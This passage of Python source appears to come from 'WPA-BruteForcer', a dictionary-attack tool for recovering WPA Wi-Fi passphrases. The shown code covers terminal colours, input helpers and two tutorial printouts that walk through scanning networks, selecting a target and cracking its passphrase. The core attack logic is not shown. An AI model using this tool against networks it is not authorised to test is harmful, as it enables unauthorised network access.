#! /usr/bin/python
#apt-get install python-socksipy
#
# This was written for educational purpose only. Use it at your own risk.
# Author will be not responsible for any damage!
# Written By SY Chua, syworks@gmail.com
#

appver="1.0, R.7"
apptitle="WPA-BruteForcer"
appDesc="- Another form of WPA Testing"
appcreated="23 Dec 2013"
appupdated="07 Jan 2014"
appnote="by SY Chua, " + appcreated + ", Updated " + appupdated


import sys,os
import subprocess
import random
import curses
from subprocess import call
from subprocess import Popen, PIPE
import termios
import tty
import time
import signal
import select 
import datetime
import binascii, re
import commands
import threading

##################################
#  Global Variables Declaration  #
##################################
global RTY
RTY=""



class fcolor:
    CReset='\033[0m'
    CBold='\033[1m'
    CDim='\033[2m'
    CUnderline='\033[4m'
    CBlink='\033[5m'
    CInvert='\033[7m'
    CHidden='\033[8m'
    CDebugB='\033[1;90m'
    CDebug='\033[0;90m'
    Black='\033[30m'
    Red='\033[31m'
    Green='\033[32m'
    Yellow='\033[33m'
    Blue='\033[34m'
    Pink='\033[35m'
    Cyan='\033[36m'
    White='\033[37m'
    SBlack='\033[0;30m'
    SRed='\033[0;31m'
    SGreen='\033[0;32m'
    SYellow='\033[0;33m'
    SBlue='\033[0;34m'
    SPink='\033[0;35m'
    SCyan='\033[0;36m'
    SWhite='\033[0;37m'
    BBlack='\033[1;30m'
    BRed='\033[1;31m'
    BBlue='\033[1;34m'
    BYellow='\033[1;33m'
    BGreen='\033[1;32m'
    BPink='\033[1;35m'
    BCyan='\033[1;36m'
    BWhite='\033[1;37m'
    UBlack='\033[4;30m'
    URed='\033[4;31m'
    UGreen='\033[4;32m'
    UYellow='\033[4;33m'
    UBlue='\033[4;34m'
    UPink='\033[4;35m'
    UCyan='\033[4;36m'
    UWhite='\033[4;37m'
    BUBlack=CBold + '\033[4;30m'
    BURed=CBold + '\033[4;31m'
    BUGreen=CBold + '\033[4;32m'
    BUYellow=CBold + '\033[4;33m'
    BUBlue=CBold + '\033[4;34m'
    BUPink=CBold + '\033[4;35m'
    BUCyan=CBold + '\033[4;36m'
    BUWhite=CBold + '\033[4;37m'
    IGray='\033[0;90m'
    IRed='\033[0;91m'
    IGreen='\033[0;92m'
    IYellow='\033[0;93m'
    IBlue='\033[0;94m'
    IPink='\033[0;95m'
    ICyan='\033[0;96m'
    IWhite='\033[0;97m'
    BIGray='\033[1;90m'
    BIRed='\033[1;91m'
    BIGreen='\033[1;92m'
    BIYellow='\033[1;93m'
    BIBlue='\033[1;94m'
    BIPink='\033[1;95m'
    BICyan='\033[1;96m'
    BIWhite='\033[1;97m'
    BGBlack='\033[40m'
    BGRed='\033[41m'
    BGGreen='\033[42m'
    BGYellow='\033[43m'
    BGBlue='\033[44m'
    BGPink='\033[45m'
    BGCyan='\033[46m'
    BGWhite='\033[47m'
    BGIBlack='\033[100m'
    BGIRed='\033[101m'
    BGIGreen='\033[102m'
    BGIYellow='\033[103m'
    BGIBlue='\033[104m'
    BGIPink='\033[105m'
    BGICyan='\033[106m'
    BGIWhite='\033[107m'

def ShowTutorial1():
    DrawLine("-",fcolor.CReset + fcolor.Black,"")
    print ""
    print fcolor.BRed + "Tutorial 1 - New Interactive Mode"
    print ""
    print fcolor.SWhite + "root@kali:/SYWorks/WPA-BruteForcer# " + fcolor.BWhite + "./wpa-bruteforcer.py " + fcolor.BRed + "\t<-- Enter the application name"
    print fcolor.SWhite + ""
    print fcolor.SWhite + "[i]  Entering Interactive Mode.." + fcolor.BRed + "\t<-- If nothing specified on command line, "
    print fcolor.SWhite + "     Started	: 2014-01-06 01:27:39" + fcolor.BRed + "\t    it will enter the Interactive Mode"
    print fcolor.SWhite + ""
    print fcolor.SWhite + "[i]  Wireless Adapter Selection"
    print fcolor.SWhite + "    =========================================================================================================="
    print fcolor.SWhite + "[*]  Sel  Iface    MAC Address          Up ?    IEEE           Status                 Mode       IP AddrSr No "
    print fcolor.SWhite + "    =========================================================================================================="
    print fcolor.SWhite + "     1.   wlan0    00:01:02:03:04:05    Down    802.11 ABGN    BROADCAST MULTICAST    Managed        1"
    print fcolor.SWhite + "     2.   wlan1    00:C0:CA:01:02:03    Down    802.11 BG      BROADCAST MULTICAST    Managed        2"
    print fcolor.SWhite + "    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^"
    print fcolor.SWhite + "[?]  Select the interface from the list [ 1-2 / 0 = Cancel ] : 1" + fcolor.BRed + "\t<-- Select the interface to use"
    print fcolor.SWhite + "     Selected Interface ==> wlan0"
    print fcolor.SWhite + ""
    print fcolor.SWhite + "[.]  Scanning for Access Point..Please wait.. [Completed]"
    print fcolor.SWhite + ""
    print fcolor.SWhite + "[i]  ESSID (Access Point Name) Selection" + fcolor.BRed + "\t<-- Once scanning completed, it will display a list of detected ESSID"
    print fcolor.SWhite + "    ==================================================================================================="
    print fcolor.SWhite + "[*]  sn   ESSID                BSSID                ENC         CH    Freq         Signal     Quality  "
    print fcolor.SWhite + "    ==================================================================================================="
    print fcolor.SWhite + "     1.   \"Testing\"            FB:CD:EF:F0:11:22    WPA2        1     2.412 GHz    -66 dBm    44/70"
    print fcolor.SWhite + "     2.   \"Test-WPA\"           00:E0:4C:01:02:03    WPA         6     2.437 GHz    -21 dBm    70/70"
    print fcolor.SWhite + "    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^"
    print fcolor.SWhite + "[?]  Select the ESSID from the list [ 1-2 / 0 = Cancel ] : 0" + fcolor.BRed + "\t<-- If target ESSID is not found, enter '0' to re-scan"
    print fcolor.SWhite + "[?]  You need to select a ESSID from the list to proceed, retry ? ( Y/n ) : "
    print fcolor.SWhite + "     Default Selected ==> Y"
    print fcolor.SWhite + "[?]  An existing list with [ 2 ] records were found, populate existing ? ( Y/n ) : "
    print fcolor.SWhite + "     Default Selected ==> Y"
    print fcolor.SWhite + "[.]  Scanning for Access Point..Please wait.. [Completed]"
    print fcolor.SWhite + "[i]  ESSID (Access Point Name) Selection"
    print fcolor.SWhite + "    ==================================================================================================="
    print fcolor.SWhite + "[*]  sn   ESSID                BSSID                ENC         CH    Freq         Signal     Quality"  
    print fcolor.SWhite + "    ==================================================================================================="
    print fcolor.SWhite + "     1.   \"Testing\"            FB:CD:EF:F0:11:22    WPA2        1     2.412 GHz    -66 dBm    44/70"
    print fcolor.SWhite + "     2.   \"SYWorks\"            FA:AB:CD:EF:00:01    WPA/WPA2    6     2.437 GHz    -48 dBm    62/70"
    print fcolor.SWhite + "     3.   \"Test-WPA\"           00:E0:4C:01:02:03    WPA         6     2.437 GHz    -21 dBm    70/70"
    print fcolor.SWhite + "    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^"
    print fcolor.SWhite + "[?]  Select the ESSID from the list [ 1-3 / 0 = Cancel ] : 2"+ fcolor.BRed + "\t<-- Select the target ESSID"
    print fcolor.SWhite + "     Selected ESSID ==> \"SYWorks\""
    print fcolor.SWhite + ""
    print fcolor.SWhite + "[i]  Dictionary Selection"
    print fcolor.SWhite + "[?]  Enter the dictionary to use for the attack ( Default : /usr/share/john/password.lst ) : "+ fcolor.BRed + "\t<-- Enter dictionary here"
    print fcolor.SWhite + "     Selected Dictionary ==> /usr/share/john/password.lst - [25.02 KB]"
    print fcolor.SWhite + ""
    print fcolor.SWhite + "[i]  TimeOut Setting"
    print fcolor.SWhite + "[?]  Enter the delay timeout in seconds ( Default : 15 ) : "+ fcolor.BRed + "\t<-- Press enter to select the default setting for timeout delay"
    print fcolor.SWhite + "     Timeout Set ==> 15"
    print fcolor.SWhite + ""
    print fcolor.SWhite + ""
    print fcolor.SWhite + "[i]  Setting Confirmation"+ fcolor.BRed + "\t\t<-- Once all setting is set, application will display a confirmation setting."
    print fcolor.SWhite + "     Interface to use	: wlan0"
    print fcolor.SWhite + "     Interface MAC Addr	: 00:01:02:03:04:05"
    print fcolor.SWhite + "     Target Access Point: \"SYWorks\""
    print fcolor.SWhite + "     Dictionary to use	: /usr/share/john/password.lst"
    print fcolor.SWhite + "     			: Filesize     - 25.02 KB"
    print fcolor.SWhite + "     			: Total lines  - 3547 lines"
    print fcolor.SWhite + "     			: Usable lines - 636 lines"
    print fcolor.SWhite + "     Timeout Setting	: 15"
    print fcolor.SWhite + "     Est. Time Use	: 2:39:00"
    print fcolor.SWhite + "     Est. Completion	: 2014-01-06 04:07:20"
    print fcolor.SWhite + ""
    print fcolor.SWhite + "[?]  The Network Manager need to be disable in order to run the test.  Disable ? ( Y/n ) : " + fcolor.BRed + "\t<-- If Network-Manager is enabled,"
    print fcolor.SWhite + "     Default Selected ==> Y"+ fcolor.BRed + "\t\t\t\t\t\t\t\t\t    disable the Network-Manager."
    print fcolor.SWhite + "     Disabling Network Manager....[Done]"
    print fcolor.SWhite + "     To re-enable it, type 'service network-manager start'"
    print fcolor.SWhite + ""
    print fcolor.SWhite + ""
    print fcolor.SWhite + "[x]  Press any key to begin with the test ... " + fcolor.BRed + "\t\t<-- Press any key to begin.."
    print fcolor.SWhite + ""
    print fcolor.SWhite + "[i]  Begin testing..."
    print fcolor.SWhite + "[.]  Trying   [ password ].... Wrong Key !"+ fcolor.BRed + "\t\t<-- If wrong passphrase, it will display 'Wrong Key'"
    print fcolor.SWhite + "[.]  Trying   [ tkipMIX1234a ]....  Wrong Key !"
    print fcolor.SWhite + "[.]  Trying   [ password1 ]....  Connection Error !!"+ fcolor.BRed + "\t\t<-- If connection error, it will extend the timeout delay timing"
    print fcolor.SWhite + "[.]  Trying   [ password1 ] with 30.0 seconds delay.. Failed !!"+ fcolor.BRed + "\t<-- Failed indicated that key is unable to test."
    print fcolor.SWhite + "[.]  Trying   [ 123456789 ]....  Wrong Key !"
    print fcolor.SWhite + "[.]  Trying   [ 12345678 ]....  Wrong Key !"
    print fcolor.SWhite + "[.]  Trying   [ 1234567890 ]....  Wrong Key !"
    print fcolor.SWhite + "[.]  Trying   [ computer ]....  Wrong Key !"
    print fcolor.SWhite + "[.]  Trying   [ Internet1234 ]....  Wrong Key !"
    print fcolor.SWhite + "[.]  Trying   [ baseball ]....  Wrong Key !"
    print fcolor.SWhite + "[.]  Trying   [ michelle ]....  Wrong Key !"
    print fcolor.SWhite + "[i]  Remain keys to try  :  626		- 1.57 % completed." + fcolor.BRed + "\t\t<-- With every 10 key tried, it will display a summary"
    print fcolor.SWhite + "     Remaing Time Needed  : 2:36:30	- Basing on current average delay rate : 15 seconds"
    print fcolor.SWhite + "     Est. Completion      : 2014-01-06 04:07:34"+ fcolor.BRed + "\t\t\t<-- showing time needed and estimated completion date/time."
    print fcolor.SWhite + "[.]  Trying   [ changeme ]....  Wrong Key !"
    print fcolor.SWhite + "[.]  Trying   [ trustno1 ]....  Wrong Key !"
    print fcolor.SWhite + "[.]  Trying   [ butthead ]....  Wrong Key !"
    print fcolor.SWhite + "[.]  Trying   [ football ]....  Wrong Key !"
    print fcolor.SWhite + "[.]  Trying   [ iloveyou ]....  Wrong Key !"
    print fcolor.SWhite + "[.]  Trying   [ testing1 ].... Connection Error !!"
    print fcolor.SWhite + "[.]  Retrying [ testing1 ] with 30.0 seconds delay.. Failed !!"
    print fcolor.SWhite + "[.]  Trying   [ jonathan ]....  Wrong Key !"
    print fcolor.SWhite + "[.]  Trying   [ MySuperPassword ]....  Successful.... " + fcolor.BRed + "\t<-- If correct passphrase is found, it will display 'Successful'"
    print fcolor.SWhite + "[i]  WPA Passphrase Found !!"+ fcolor.BRed + "\t\t\t\t    with the correct passphrase shown."
    print fcolor.SWhite + "     ESSID	[ \"SYWorks\" ]"
    print fcolor.SWhite + "     Passphrase	[ " + fcolor.BWhite + "MySuperPassword" + fcolor.SWhite + " ]"
    print fcolor.SWhite + ""
    print fcolor.SWhite + "[*]  Application shutdown !!"+ fcolor.BRed + "\t\t<-- Application will then exit."
    print fcolor.SWhite + "     Started	: 2014-01-06 01:27:39"
    print fcolor.SWhite + "     Stopped	: 2014-01-06 01:33:23"
    print fcolor.SWhite + "     Time Spent	: 0:05:43.69"
    print fcolor.SWhite + ""
    print fcolor.SWhite + "root@kali:/SYWorks/WPA-BruteForcer#" 

def ShowTutorial2():
    DrawLine("-",fcolor.CReset + fcolor.Black,"")
    print ""
    print fcolor.BRed + "Tutorial 2 - Continue from last scan"
    print ""
    print fcolor.SWhite + "root@kali:/SYWorks/WPA-BruteForcer# " + fcolor.BWhite + "./wpa-bruteforcer.py " + fcolor.BRed + "\t\t<-- Enter the application name"
    print fcolor.SWhite + ""
    print fcolor.SWhite + "[i]  Entering Interactive Mode.."
    print fcolor.SWhite + "     Started	: 2014-01-06 01:36:48"
    print fcolor.SWhite + ""
    print fcolor.SWhite + "[i]  A previous log file was found with the following setting:"+ fcolor.BRed + "\t<-- If a previous scan log found,"
    print fcolor.SWhite + "     ESSID	   : \"SYWorks\""+ fcolor.BRed + "\t\t\t\t\t    it will display the previous setting."
    print fcolor.SWhite + "     Interface	   : wlan0"
    print fcolor.SWhite + "     Dictionary	   : /usr/share/john/password.lst"
    print fcolor.SWhite + "     Timeout	   : 15"
    print fcolor.SWhite + "     Last Pass	   : 12345678"
    print fcolor.SWhite + "     Last Scan	   : 2014-01-06 01:33:23"
    print fcolor.SWhite + ""
    print fcolor.SWhite + "[?]  Continue with previous scan log ? ( Y/n ) : "+ fcolor.BRed + "\t<-- Enter 'Y' to continue on previous scan"
    print fcolor.SWhite + "     Default Selected ==> Y"
    print fcolor.SWhite + ""
    print fcolor.SWhite + "[>]  Interface Selection Bypassed...."+ fcolor.BRed + "\t\t<-- It will bypass setting and use back previous setting."
    print fcolor.SWhite + "     Selected Interface ==> wlan0"
    print fcolor.SWhite + ""
    print fcolor.SWhite + "[>]  ESSID Scanning Bypassed...."
    print fcolor.SWhite + "     Selected ESSID ==> \"SYWorks\""
    print fcolor.SWhite + ""
    print fcolor.SWhite + "[>]  Dictionary Selection Bypassed...."
    print fcolor.SWhite + "     Selected Dictionary ==> /usr/share/john/password.lst - [25.02 KB]"
    print fcolor.SWhite + ""
    print fcolor.SWhite + "[>]  Timeout Setting Bypassed...."
    print fcolor.SWhite + "     Timeout Set ==> 15"
    print fcolor.SWhite + ""
    print fcolor.SWhite + ""
    print fcolor.SWhite + "[i]  Setting Confirmation"+ fcolor.BRed + "\t\t<-- Once all setting is set, application will display a confirmation setting."
    print fcolor.SWhite + "     Interface to use	: wlan0"
    print fcolor.SWhite + "     Interface MAC Addr	: 00:01:02:03:04:05"
    print fcolor.SWhite + "     Target Access Point: \"SYWorks\""
    print fcolor.SWhite + "     Dictionary to use	: /usr/share/john/password.lst"
    print fcolor.SWhite + "     			: Filesize     - 25.02 KB"
    print fcolor.SWhite + "     			: Total lines  - 3547 lines"
    print fcolor.SWhite + "     			: Usable lines - 636 lines"
    print fcolor.SWhite + "     Timeout Setting	: 15"
    print fcolor.SWhite + "     Est. Time Use	: 2:39:00"
    print fcolor.SWhite + "     Est. Completion	: 2014-01-06 04:15:53"
    print fcolor.SWhite + ""
    print fcolor.SWhite + "[x]  Press any key to begin with the test ... "+ fcolor.BRed + "\t\t<-- Press any key to begin.."
    print fcolor.SWhite + ""
    print fcolor.SWhite + "[i]  Begin testing..."
    print fcolor.SWhite + "     Resuming from last passphrase : 12345678..."+ fcolor.BRed + "\t\t<-- Application will resume from last scan"
    print fcolor.SWhite + "[.]  Trying   [ 1234567890 ]....  Wrong Key !"
    print fcolor.SWhite + "[.]  Trying   [ computer ]....  Wrong Key !"+ fcolor.BRed + "\t\t<-- If wrong passphrase, it will display 'Wrong Key'"
    print fcolor.SWhite + "[.]  Trying   [ Internet1234 ]....  Wrong Key !"
    print fcolor.SWhite + "[.]  Trying   [ baseball ]....  Wrong Key !"
    print fcolor.SWhite + "[.]  Trying   [ michelle ]....  Wrong Key !"
    print fcolor.SWhite + "[i]  Remain keys to try  :  626		- 1.57 % completed."+ fcolor.BRed + "\t\t<-- With every 10 key tried, it will display a summary"
    print fcolor.SWhite + "     Remaing Time Needed  : 2:36:30	- Basing on current average delay rate : 15 seconds"
    print fcolor.SWhite + "     Est. Completion      : 2014-01-06 04:07:34"+ fcolor.BRed + "\t\t\t<-- showing time needed and estimated completion date/time."
    print fcolor.SWhite + "[.]  Trying   [ changeme ]....  Wrong Key !"
    print fcolor.SWhite + "[.]  Trying   [ trustno1 ]....  Wrong Key !"
    print fcolor.SWhite + "[.]  Trying   [ butthead ]....  Wrong Key !"
    print fcolor.SWhite + "[.]  Trying   [ football ]....  Wrong Key !"
    print fcolor.SWhite + "[.]  Trying   [ iloveyou ]....  Wrong Key !"
    print fcolor.SWhite + "[.]  Trying   [ testing1 ].... Connection Error !!"+ fcolor.BRed + "\t\t<-- If connection error, it will extend the timeout delay timing"
    print fcolor.SWhite + "[.]  Retrying [ testing1 ] with 30.0 seconds delay.. Wrong Key !"
    print fcolor.SWhite + "[.]  Trying   [ jonathan ]....  Wrong Key !"
    print fcolor.SWhite + "[.]  Trying   [ MySuperPassword ]....  Successful.... " + fcolor.BRed + "\t<-- If correct passphrase is found, it will display 'Successful'"
    print fcolor.SWhite + "[i]  WPA Passphrase Found !!"+ fcolor.BRed + "\t\t\t\t    with the correct passphrase shown."
    print fcolor.SWhite + "     ESSID	[ \"SYWorks\" ]"
    print fcolor.SWhite + "     Passphrase	[ " + fcolor.BWhite + "MySuperPassword" + fcolor.SWhite + " ]"
    print fcolor.SWhite + ""
    print fcolor.SWhite + "[*]  Application shutdown !!"+ fcolor.BRed + "\t\t<-- Application will then exit."
    print fcolor.SWhite + "     Started	: 2014-01-06 01:36:48"
    print fcolor.SWhite + "     Stopped	: 2014-01-06 01:40:36"
    print fcolor.SWhite + "     Time Spent	: 0:03:47.50"
    print fcolor.SWhite + ""
    print fcolor.SWhite + "root@kali:/SYWorks/WPA-BruteForcer# "


def read_a_key():
    stdinFileDesc = sys.stdin.fileno()
    oldStdinTtyAttr = termios.tcgetattr(stdinFileDesc)
    try:
        tty.setraw(stdinFileDesc)
        sys.stdin.read(1)
    finally:
        termios.tcsetattr(stdinFileDesc, termios.TCSADRAIN, oldStdinTtyAttr)

def printc(ptype, ptext,ptext2):
    """
    Function	   : Displaying text with pre-defined icon and color
    Usage of printc:
        ptype      - Type of Icon to display
        ptext      - First sentence to display
        ptext2     - Second sentence, "?" as reply text, "@"/"@^" as time in seconds
    Examples       : Lookup DemoOnPrintC() for examples
    """

    ScriptName=os.path.basename(__file__)
    printd("PType - " + str(ptype) + "\n       " + "PText = " + str(ptext) + "\n       " + "PText2 = " + str(ptext2))
    ReturnOut=""
    bcolor=fcolor.SWhite
    if ptype=="i":
        pcolor=fcolor.BBlue
        tcolor=fcolor.BWhite
    if ptype=="H":
        pcolor=fcolor.BBlue
        tcolor=fcolor.BWhite
        hcolor=fcolor.BUBlue
    if ptype=="!":
        pcolor=fcolor.BRed
        tcolor=fcolor.BYellow
    if ptype=="!!":
        ptype="!"
        pcolor=fcolor.BRed
        tcolor=fcolor.SRed
    if ptype=="!!!":
        ptype="!"
        pcolor=fcolor.BRed
        tcolor=fcolor.BRed
    if ptype==".":
        pcolor=fcolor.BGreen
        tcolor=fcolor.SGreen
    if ptype=="-":
        pcolor=fcolor.SWhite
        tcolor=fcolor.SWhite
    if ptype=="--":
        ptype="-"
        pcolor=fcolor.BWhite
        tcolor=fcolor.BWhite
    if ptype=="..":
        ptype="."
        pcolor=fcolor.BGreen
        tcolor=fcolor.BGreen
    if ptype==">" or ptype=="+":
        pcolor=fcolor.BCyan
        tcolor=fcolor.BCyan
    if ptype==" ":
        pcolor=fcolor.BYellow
        tcolor=fcolor.Green
    if ptype=="  ":
        pcolor=fcolor.BYellow
        tcolor=fcolor.BGreen
    if ptype=="?":
        pcolor=fcolor.BYellow
        tcolor=fcolor.BGreen
    if ptype=="x":
        pcolor=fcolor.BRed
        tcolor=fcolor.BBlue
    if ptype=="*":
        pcolor=fcolor.BYellow
        tcolor=fcolor.BPink
    if ptype=="@" or ptype=="@^":
        pcolor=fcolor.BRed
        tcolor=fcolor.White

    if ptext!="":
        tscolor=fcolor.Blue
        ts = time.time()
        DateTimeStamp=datetime.datetime.fromtimestamp(ts).strftime('%d/%m/%Y %H:%M:%S')
        TimeStamp=datetime.datetime.fromtimestamp(ts).strftime('%H:%M:%S')
        DateStamp=datetime.datetime.fromtimestamp(ts).strftime('%d/%m/%Y')
        ptext=ptext.replace("%dt -",tscolor + DateTimeStamp + " -" + tcolor)
        ptext=ptext.replace("%dt",tscolor + DateTimeStamp + tcolor)
        ptext=ptext.replace("%t -",tscolor + TimeStamp + " -" + tcolor)
        ptext=ptext.replace("%t",tscolor + TimeStamp + tcolor)
        ptext=ptext.replace("%d -",tscolor + DateStamp + " -" + tcolor)
        ptext=ptext.replace("%d",tscolor + DateStamp + tcolor)
        ptext=ptext.replace("%an",tscolor + ScriptName + tcolor)
        if "%cs" in ptext:
            ptext=ptext.replace("%cs",tscolor + ptext2 + tcolor)
            ptext2=""
        lptext=len(ptext) 
        if lptext>6:
            firstsix=ptext[:6].lower()
            if firstsix=="<$rs$>":
                ReturnOut="1"
                lptext=lptext-6
                ptext=ptext[-lptext:]
    if ptype=="x":
        if ptext=="":
            ptext="Press Any Key To Continue..."
        c1=bcolor + "[" + pcolor + ptype + bcolor + "]  " + tcolor + ptext
        print c1,
        sys.stdout.flush()
        read_a_key()
        print ""
        return
    if ptype=="H":
        c1=bcolor + "[" + pcolor + "i" + bcolor + "]  " + hcolor + ptext + fcolor.CReset 
        if ReturnOut!="1":
            print c1
            return c1
        else:
            return c1
    if ptype=="@" or ptype=="@^":
        if ptext2=="":
            ptext2=5
        t=int(ptext2)
        while t!=0:
            s=bcolor + "[" + pcolor + str(t) + bcolor + "]  " + tcolor + ptext + "\r"
            s=s.replace("%s",pcolor+str(ptext2)+tcolor)
            sl=len(s)
            print s,
            sys.stdout.flush()
            time.sleep(1)
            s=""
            ss="\r"
            print "" + s.ljust(sl+2) + ss,
            sys.stdout.flush()
            if ptype=="@^":
                t=t-1
                while sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
                    line = sys.stdin.readline()
                    if line:
                        print bcolor + "[" + fcolor.BRed + "!" + bcolor + "]  " + fcolor.Red + "Interupted by User.." + fcolor.Green
                        return
            else:
                t=t-1            
        c1=bcolor + "[" + pcolor + "-" + bcolor + "]  " + tcolor + ptext + "\r"
        c1=c1.replace("%s",pcolor+str(ptext2)+tcolor)
        print c1,
        sys.stdout.flush()
        print ""
        return
    if ptype=="?":
        if ptext2!="":
            usr_resp=raw_input(bcolor + "[" + pcolor + ptype + bcolor + "]  " + tcolor + ptext + " ( " + pcolor + ptext2 + tcolor + " ) : " + fcolor.BWhite)
            return usr_resp;
        else:
            usr_resp=raw_input(bcolor + "[" + pcolor + ptype + bcolor + "]  " + tcolor + ptext + " : " + fcolor.BWhite)
            return usr_resp;
    if ptype==" " or ptype=="  ":
        if ReturnOut!="1":
            print bcolor + "     " + tcolor + ptext + ptext2
        else:
            return bcolor + "     " + tcolor + ptext + ptext2
    else:
        if ReturnOut!="1":
            print bcolor + "[" + pcolor + ptype + bcolor + "]  " + tcolor + ptext + ptext2
        else:
            return bcolor + "[" + pcolor + ptype + bcolor + "]  " + tcolor + ptext + ptext2

def AskQuestion(QuestionText, ReplyText,ReplyType,DefaultReply,DisplayReply):
    """
    Function	        : Question for user input. Quite similar to printc("?") function
    Usage of AskQuestion:
        QuestionText    - Question Text to ask
        ReplyText       - The reply text. Ex : "Y/n")
    Examples            : Lookup DemoOnPrintC() for examples
    """
    if DisplayReply=="":
        DisplayReply=1

    bcolor=fcolor.SWhite
    pcolor=fcolor.BYellow
    tcolor=fcolor.BGreen
    if ReplyText!="":
        usr_resp=raw_input(bcolor + "[" + pcolor + "?" + bcolor + "]  " + tcolor + QuestionText + " ( " + pcolor + ReplyText + tcolor + " ) : " + fcolor.BWhite)
    else:
        usr_resp=raw_input(bcolor + "[" + pcolor + "?" + bcolor + "]  " + tcolor + QuestionText + " : " + fcolor.BWhite)

    if DefaultReply!="":
        if usr_resp=="":
            if DisplayReply=="1":
                printc (" ",fcolor.SWhite + "Default Selected ==> " + fcolor.BYellow + str(DefaultReply),"")   
            return DefaultReply
        else:
            if ReplyType=="U":
               if DisplayReply=="1":
                   printc (" ",fcolor.SWhite + "Selected ==> " + fcolor.BYellow + str(usr_resp.upper()),"")   
               return usr_resp.upper()
            if ReplyType=="FN":
               if os.path.isfile(usr_resp)==True:
                   if DisplayReply=="1":
                       printc (" ",fcolor.SWhite + "Filename ==> " + fcolor.BYellow + str(usr_resp),"")   
                   return usr_resp
               else:
                   printc ("!!","Filename [" + fcolor.SYellow + usr_resp + fcolor.SRed + "] does not exist !.","")
                   usr_resp=AskQuestion(QuestionText, ReplyText,ReplyType,DefaultReply,DisplayReply)
                   return usr_resp;
            if ReplyType=="FP":
               if os.path.exists(usr_resp)==True:
                   if DisplayReply=="1":
                       printc (" ",fcolor.SWhite + "Path ==> " + fcolor.BYellow + str(usr_resp),"")   
                   return usr_resp
               else:
                   printc ("!!","Filename/Pathname [" + fcolor.SYellow + usr_resp + fcolor.SRed + "] does not exist !.","")
                   usr_resp=AskQuestion(QuestionText, ReplyText,ReplyType,DefaultReply,DisplayReply)
                   return usr_resp;
            if ReplyType=="PN":
               if os.path.isdir(usr_resp)==True:
                   if usr_resp[-1:]!="/":
                       usr_resp=usr_resp + "/"
                   if DisplayReply=="1":
                       printc (" ",fcolor.SWhite + "Path ==> " + fcolor.BYellow + str(usr_resp),"")   
                   return usr_resp
               else:
                   printc ("!!","Path [" + fcolor.SYellow + usr_resp + fcolor.SRed + "] does not exist !.","")
                   usr_resp=AskQuestion(QuestionText, ReplyText,ReplyType,DefaultReply,DisplayReply)
                   return usr_resp;
            if ReplyType=="L":
               if DisplayReply=="1":
                   printc (" ",fcolor.SWhite + "Selected ==> " + fcolor.BYellow + str(usr_resp.lower()),"")   
               return usr_resp.lower()
            if ReplyType=="N":
               if usr_resp.isdigit()==True:
                   if DisplayReply=="1":
                       printc (" ",fcolor.SWhite + "Selected ==> " + fcolor.BYellow + str(usr_resp),"")   
                   return usr_resp;
               else:
                   usr_resp=AskQuestion(QuestionText, ReplyText,ReplyType,DefaultReply,DisplayReply)
                   return usr_resp;
    if DefaultReply=="":
        if usr_resp=="":
            if ReplyText!="":
                usr_resp=raw_input(bcolor + "[" + pcolor + "?" + bcolor + "]  " + tcolor + QuestionText + " ( " + pcolor + ReplyText + tcolor + " ) : " + fcolor.BWhite)
                return usr_resp;
            else:
                if ReplyType=="MA" or ReplyType=="FN" or ReplyType=="PN" or ReplyType=="FP":
                    usr_resp=AskQuestion(QuestionText, ReplyText,ReplyType,DefaultReply,DisplayReply)
                    return usr_resp;
                else:
                    if DisplayReply=="1":
                        printc (" ",fcolor.SWhite + "Selected ==> " + fcolor.BYellow + str("Nothing"),"")   
                    return usr_resp;
        else:
            if ReplyType=="MN":
               if usr_resp.isdigit()==True:
                   if DisplayReply=="1":
                       printc (" ",fcolor.SWhite + "Selected ==> " + fcolor.BYellow + str(usr_resp),"")   
                   return usr_resp;
               else:
                   usr_resp=AskQuestion(QuestionText, ReplyText,ReplyType,DefaultReply,DisplayReply)
                   return usr_resp;
            if ReplyType=="FN":
               if os.path.isfile(usr_resp)==True:
                   if DisplayReply=="1":
                       printc (" ",fcolor.SWhite + "Filename ==> " + fcolor.BYellow + str(usr_resp),"")   
                   return usr_resp
               else:
                   printc ("!!","Filename [" + fcolor.SYellow + usr_resp + fcolor.SRed + "] does not exist !.","")
                   usr_resp=AskQuestion(QuestionText, ReplyText,ReplyType,DefaultReply,DisplayReply)
                   return usr_resp;
            if ReplyType=="PN":
               if os.path.isdir(usr_resp)==True:
                   if usr_resp[-1:]!="/":
                       usr_resp=usr_resp + "/"
                       if DisplayReply=="1":
                           printc (" ",fcolor.SWhite + "Path ==> " + fcolor.BYellow + str(usr_resp),"")   
                   return usr_resp
               else:
                   printc ("!!","Path [" + fcolor.SYellow + usr_resp + fcolor.SRed + "] does not exist !.","")
                   usr_resp=AskQuestion(QuestionText, ReplyText,ReplyType,DefaultReply,DisplayReply)
                   return usr_resp;
            if ReplyType=="FP":
               if os.path.exists(usr_resp)==True:
                   if os.path.isfile(usr_resp)==True:
                       if DisplayReply=="1":
                           printc (" ",fcolor.SWhite + "Filename ==> " + fcolor.BYellow + str(usr_resp),"")   
                       return usr_resp
                   if os.path.isdir(usr_resp)==True:
                       if usr_resp[-1:]!="/":
                           usr_resp=usr_resp + "/"
                       if DisplayReply=="1":
                           printc (" ",fcolor.SWhite + "Path ==> " + fcolor.BYellow + str(usr_resp),"")   
                       return usr_resp
                   return usr_resp
               else:
                   printc ("!!","Filename/Pathname [" + fcolor.SYellow + usr_resp + fcolor.SRed + "] does not exist !.","")
                   usr_resp=AskQuestion(QuestionText, ReplyText,ReplyType,DefaultReply,DisplayReply)
                   return usr_resp;

            if ReplyType=="U":
               if DisplayReply=="1":
                   printc (" ",fcolor.SWhite + "Selected ==> " + fcolor.BYellow + str(usr_resp.upper()),"")   
               return usr_resp.upper()
            if ReplyType=="L":
               if DisplayReply=="1":
                   printc (" ",fcolor.SWhite + "Selected ==> " + fcolor.BYellow + str(usr_resp.lower()),"")   
               return usr_resp.lower()
            if ReplyType=="N":
               if usr_resp.isdigit()==True:
                   if DisplayReply=="1":
